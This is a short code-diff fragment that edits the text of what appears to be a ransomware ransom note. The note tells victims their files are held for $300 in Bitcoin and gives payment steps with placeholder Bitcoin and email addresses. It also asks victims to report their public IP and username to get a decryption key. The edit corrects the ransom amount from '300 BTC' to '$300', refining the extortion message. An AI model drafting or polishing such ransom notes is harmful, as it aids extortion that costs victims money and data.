@@ -262,7 +262,7 @@ To get them back, you need to follow the instructions below.
 - The amount of the ransom is $300 in Bitcoin.
 
 3. Instructions for payment:
-- Buy Bitcoin (BTC) and send 300 BTC to the address: [Bitcoin Address Here]
+- Buy Bitcoin (BTC) and send $300 to the address: [Bitcoin Address Here]
 - After the transaction is confirmed, send an email to [Email Address Here] with your public IP (https://api.ipify.org) and username. You will then receive a decryption key to unlock your files.
 
 4. Warning!
